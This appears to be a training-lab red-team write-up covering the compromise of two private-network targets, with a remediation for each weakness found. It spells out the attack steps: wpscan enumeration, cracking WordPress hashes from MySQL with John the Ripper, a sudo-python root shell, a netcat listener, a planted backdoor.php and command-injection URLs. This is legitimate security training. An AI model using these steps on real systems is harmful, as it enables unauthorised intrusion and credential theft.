<h1>Red Team: Summary of Operations</h1>

<h2> Table of Contents</h3>
<p> Exposed Services </p> 
<p> Critical Vulnerabilities </p> 
<p> Exploitation Process </p> 

<h2> Exposed Services</h2>

Nmap scan results for each machine reveal the below services and OS details:
  <p> </p> 

$ nmap -v -sV -O 192.168.1.110
  ![nmapTarget1]/images/nmap-vsVO_Target1.txt

$ nmap  -v -sV -O 192.168.1.115
  ![nmapTarget2]/images/nmap-vsVO_Target2.txt


This scan identifies the services below as potential points of entry:

- Target 1: List of Exposed Services

 PORT | STATE | SERVICE | VERSION
 ------------ | ------------- | ------------- | -------------
22/tcp | open | ssh | OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp | open | http | Apache httpd 2.4.10 ((Debian))
111/tcp | open | rpcbind | 2-4 (RPC #100000)
139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X 
445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X 

- Target 2: List of Exposed Services

 PORT | STATE | SERVICE | VERSION
  ------------ | ------------- | ------------- | -------------
22/tcp | open | ssh | OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp | open | http | Apache httpd 2.4.10 ((Debian))
111/tcp | open | rpcbind | 2-4 (RPC #100000)
139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X 
445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X 


<h2>Critical Vulnerabilities</h2>


The following vulnerabilities were identified on each target:

 <h4> Target 1 and Target 2: List of Critical Vulnerabilities </h4>

cpe:/a:apache:http_server:2.4.10: 
CVE REFERENCE | RATING | IN BRIEF
 ------------ | ------------- | ------------- 
 https://vulners.com/cve/CVE-2020-11984 | 7.5 | mod_proxy_uwsgi info disclosure, possible Remote Code Execution
 https://vulners.com/cve/CVE-2017-7679 | 7.5 | mod_mime buffer overread
 https://vulners.com/cve/CVE-2017-7668 | 7.5 | a bug in token list parsing
 https://vulners.com/cve/CVE-2017-3169 | 7.5 | mod_ssl may dereference a NULL pointer
 https://vulners.com/cve/CVE-2017-3167 | 7.5 | may lead to authentication requirements being bypassed
 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB  | 7.2 | apache2ctl graceful logrotate Local Privilege Escalation *EXPLOIT*
 https://vulners.com/cve/CVE-2019-0211 | 7.2 | privilege escalation from modules' scripts
 https://vulners.com/zdt/1337DAY-ID-32502 | 7.2 | apache2ctl graceful logrotate Local Privilege Escalation *EXPLOIT*
 https://vulners.com/cve/CVE-2018-1312 | 6.8 | Weak Digest auth nonce generation in mod_auth_digest
 https://vulners.com/cve/CVE-2017-15715 | 6.8 | <FilesMatch> bypass with a trailing newline in the file name
 https://vulners.com/cve/CVE-2019-10082 | 6.4 | http/2 session handling could be made to read memory after being freed, during connection shutdown
 https://vulners.com/cve/CVE-2017-9788 | 6.4 | could reflect the stale value of uninitialized pool memory used by the prior request
 https://vulners.com/cve/CVE-2019-10097 | 6.0 | 
 https://vulners.com/cve/CVE-2019-0217 | 6.0 | 
 https://vulners.com/exploitdb/EDB-ID:47689 | 5.8 |  *EXPLOIT*
 https://vulners.com/cve/CVE-2020-1927 | 5.8 | 
 https://vulners.com/cve/CVE-2019-10098 | 5.8 | 
 https://vulners.com/zdt/1337DAY-ID-33577 | 5.8 | *EXPLOIT*
 https://vulners.com/cve/CVE-2016-5387 | 5.1 | 
 https://vulners.com/seebug/SSV:96537 | 5.0 | *EXPLOIT*
 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED | 5.0 | *EXPLOIT*
 https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7 | 5.0 | *EXPLOIT*
 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D | 5.0 | *EXPLOIT*
 https://vulners.com/cve/CVE-2020-9490 | 5.0 | 
 https://vulners.com/cve/CVE-2020-1934 | 5.0 | 
 https://vulners.com/cve/CVE-2019-10081 | 5.0 |
 https://vulners.com/cve/CVE-2019-0220 | 5.0 | 
 https://vulners.com/cve/CVE-2019-0196 | 5.0 | 
 https://vulners.com/cve/CVE-2018-17199 | 5.0 | 
 https://vulners.com/cve/CVE-2018-17189 | 5.0 |
 https://vulners.com/cve/CVE-2018-1333 | 5.0 | 
 https://vulners.com/cve/CVE-2018-1303 | 5.0 | 
 https://vulners.com/cve/CVE-2017-9798 | 5.0 | 
 https://vulners.com/cve/CVE-2017-15710 | 5.0 | 
 https://vulners.com/cve/CVE-2016-8743 | 5.0 | 
 https://vulners.com/cve/CVE-2016-2161 | 5.0 | 
 https://vulners.com/cve/CVE-2016-0736| 5.0 | 
 https://vulners.com/cve/CVE-2015-3183 | 5.0 | 
 https://vulners.com/cve/CVE-2015-0228 | 5.0 | 
 https://vulners.com/cve/CVE-2014-3583 | 5.0 | 
 https://vulners.com/zdt/1337DAY-ID-28573 | 5.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-26574 | 5.0 | *EXPLOIT*
 https://vulners.com/cve/CVE-2019-0197 | 4.9 | 
 https://vulners.com/exploitdb/EDB-ID:47688 | 4.3 | *EXPLOIT*
 https://vulners.com/cve/CVE-2020-11993 | 4.3 | 
 https://vulners.com/cve/CVE-2020-11985 | 4.3 | 
 https://vulners.com/cve/CVE-2019-10092 | 4.3 | 
 https://vulners.com/cve/CVE-2018-1302 | 4.3 | 
 https://vulners.com/cve/CVE-2018-1301 | 4.3 | 
 https://vulners.com/cve/CVE-2018-11763 | 4.3 | 
 https://vulners.com/cve/CVE-2016-4975 | 4.3 | 
 https://vulners.com/cve/CVE-2015-3185 | 4.3 | 
 https://vulners.com/cve/CVE-2014-8109 | 4.3 | 
 https://vulners.com/zdt/1337DAY-ID-33575 | 4.3 | *EXPLOIT*
 https://vulners.com/cve/CVE-2018-1283 | 3.5 | 
 https://vulners.com/cve/CVE-2016-8612 | 3.3 | 
 https://vulners.com/packetstorm/PACKETSTORM:152441 | 0.0 | *EXPLOIT*
 https://vulners.com/packetstorm/PACKETSTORM:140265 | 0.0 | *EXPLOIT*
 https://vulners.com/exploitdb/EDB-ID:46676 | 0.0 | *EXPLOIT*
 https://vulners.com/exploitdb/EDB-ID:42745 | 0.0 | *EXPLOIT*
 https://vulners.com/exploitdb/EDB-ID:40961 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-663 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-601 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-4533 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-3109 | 0.0 |  *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-2237 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-1415 | 0.0 | *EXPLOIT*
 https://vulners.com/zdt/1337DAY-ID-1161 | 0.0 | *EXPLOIT*

  <b>nmap --script vuln -sV -p80 192.168.1.110</b>
   ![nmapVulnTarget1](/Images/nmap_vuln_Target1.txt)

Target 2 returned identical results to Target 1 

  <b>nmap --script vuln -sV -p80 192.168.1.115</b>
   ![nmapVulnTarget2](/Images/nmap_vuln_Target2.txt)

<h2>Exploitation Process</h2>


The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve the following confidential data:

<h3>Target 1</h3>
  - flag1 hash value: `b9bbcd33e11b80be759c4e844862482d`
      ![flag1](/Images/flag1-found_Target1.png)
    - **Exploit Used**
      - (Common Weakness) CWE-540: Inclusion of Sensitive Information in Source Code 
      - Click SERVICE link > 192.168.1.110/service.html, Right Click, View Source, flag1 is visible in a commented out line below the footer. 
      
     REMEDIATION: Source code should be reviewed and all comments removed from production versions of code.

  - flag2 hash value: `fc3fd58dcdad9ab23faca6e9a36e581c`
      ![flag2](/Images/flag2-found_Target1.PNG)
    - **Exploit Used**
      - (Common Weakness) CWE-521: Weak Password Requirements
      - an easily guessed password for user michael (ssh login),
      michael@target1:/var/www/html/wordpress$ 'cat wp-config.php'
      
    REMEDIATION: Enforcement of password policy on the machine.
      install libpam- pwquality: <b>'sudo apt install libpam-pwquality'<\b>
      EDIT /etc/pam.d/common-password (use vi or nano)
    	find the line: password   requisite   pam_pwquality.so retry=3
	append: 'minlen=12 maxrepeat=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 difok=4 reject_username enforce_for_root'


      Identified wordpress installed through testing links on homepage; BLOG directs to  192.168.1.110/wordpress
      ![BLOG](/Images/BLOG_Target1.png)
      This page has a Log in link
      ![loginURL](/Images/Login_URL_Target1.png)
      ![wp-login](/Images/wp-login_Target1.png)
      
      Run wpscan to enumerate users: <b>'wpscan --url http://192.168.1.110/wordpress --enumerate u'<\b>
      
      ![wpscan1a](/Images/WPScan_Target1a.PNG)
      ![wpscan1b](/Images/WPScan_Target1b.PNG)

  - flag3 hash value: `afc01ab5650591e7dccf93122770cd2`
      ![flag3](/Images/flag3-detail_Target1.png)
    - **Exploit Used**
      - (Common Weakness) CWE-260: Password in configuration file
      wp-config.php contained DB_NAME, DB_USER, DB_PASSWORD for root user in clear text
      ![wp-config.php]/images/wp-config_Target1.PNG
      
    REMEDIATION: The principle of least privilege should be enforced.
      'chmod 600 /var/www/html/wordpress/wp-config.php'
    michael@target1:/user/bin$ 'mysql -u root -p'
      ![mysql-login](/Images/mysql-login_Target1.png)
      
    mysql login achieved - what can we find ?
      
    'show databases;'
    
    ![databases](/Images/mysql-db_Target1.PNG)
    
    'show tables;'
    
    ![tables](/Images/mysql-tables_Target1.png)
    
    'describe wp_posts;'
    
    ![posts](/Images/mysql-wp_posts_Target1.PNG)
    
    I noted that the default value for post_status = 'publish'
    'select * FROM wp_posts WHERE post_status != 'publish''
    ![user-passwd](/Images/mysql-user-login-pass_Target1.png)
    
    'show tables;'
    ![tables](/Images/mysql-tables_Target1.png)
    
    'describe wp_users;'
    ![wp-users](/Images/mysql-wp_users_Target1.png)
    
    'select user_login, user_pass from wp_users;'
    ![user-passwd](/Images/mysql-user-login-pass_Target1.png)

    Create file wp_hashes.txt
    ![wp-hashes](/Images/wp_hashes_Target1.png)
    
    Use John The Ripper to unhash the password of user steven
    'john --wordlist=/root/Downloads/rockyou.txt /root/Downloads/wp_hashes.txt'
    ![john](/Images/john-steven_Target1.png)

    ssh into Target1 as steven: 'ssh steven@192.168.1.110'
    ![ssh-steven](/Images/ssh-steven_Target1.png)
    
    Verify the sudo permissions of steven: sudo -l'
    ![sudo-l](/Images/sudo-steven_Target1.png)
    
    We see steven has sudo permission for python
    We can exploit this to gain a shell as root: <b>'python -c 'import pty;pty.spawn("/bin/bash")''</b>
    ![priv-escln](/Images/privilege-escalation_py_Target1.png)
    
    Now as root, search for flag file 
    ![found4](/Images/flag4-found_Target1.png)
    
    Display the contents of flag4.txt
    ![flag4](/Images/flag4-detail_Target1.png)

      - flag4 hash value: `715dea6c055b9fe3337544932f2941ce`
      ![found4](/Images/flag4-found_Target1.png)
    - **Exploit Used**
      - (Common Weakness) CWE-250: Execution with Unnecessary Privileges
      User steven has excessive privileges
      ![excess-priv](/images/sudo-steven_Target1.PNG)
      
    REMEDIATION: The principle of least privilege should be enforced.
     Limit sudo to specific functions that require it, such as restarting a service that runs with root privilege
     We need to run visudo to edit /etc/sudoers or add specific config under the /etc/sudoers.d directory

<h3>Target 2</h3>
  - flag1 hash value: `a2c1f66d2b8051db3a5874b5874b5b6e43e21`
      ![found1-T2](/Images/flag1-found_Target2.png)
    - **Exploit Used**
      - (Common Weakness) CWE-548: Information leakage through directory listing
      - 'gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115'
    ![gobuster](/Images/gobuster_Target2.png)
    
    Browsing the directories discovered I found flag1 at 192.168.1.115/vendor/PATH (/var/www/html/vendor)
    
    ![vendor]/(Images/vendor_Target2.PNG)
    
    ![found1-T2](/Images/flag1-found_target2.PNG)
    
    REMEDIATION: Disable directory listing.
    	In .ht access (must be added in each folder) we should add line, "Options -Indexes" OR
      	we can disable directory listing for a specified directory by adding this code in Apache Virtual Host
       
      <Directory /var/www/public_html>
          Options -Indexes
      </Directory>

  - flag2 hash value: `6a8ed560f0b5358ecf844108048eb337`
      ![found2-T2](/Images/flag2-found_Target2.PNG)
    - **Exploit Used**
      - (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
      - '192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''      
      ![findflags](/Images/find-flags_Target2.PNG)
      
       (The path to flag3 is also disclosed here)
	   
      - '192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'
      
    REMEDIATION: Proper input controls within the application would prevent the execution of this exploit. 
     
     <h4>Establishing the backdoor;</h4>
     The script provided was edited to include the IP of target2
     exploit.sh generates backdoor.php on the target, encoded with functions to allow command injection 
     
    ![backdoor.php](/Images/edited-exploit_Target2.png)
    
    Prior to execution, establish a netcat session: <b>'nc -lvnp 4444'</b>
     <b>'./exploit.sh'</b>
     
    ![runExploit](/Images/run-exploit_Target2.png)
    
    We now have a command injection script (backdoor.php) on Target 2 that is accessible via browser.

  - flag3 hash value: `a0f568aa9de277887f37730d71520d9b`
     ![flag3-T2](/Images/flag3-found_Target2.PNG)
    - **Exploit Used**
      - (Common Weakness) CWE-522: Local file inclusion
      - '192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png'
      
      REMEDIATION: Proper access controls should be in place in the content areas.
       As this is sensitive information, an additional control to restrict access would be preferable, such as data encrytion. 
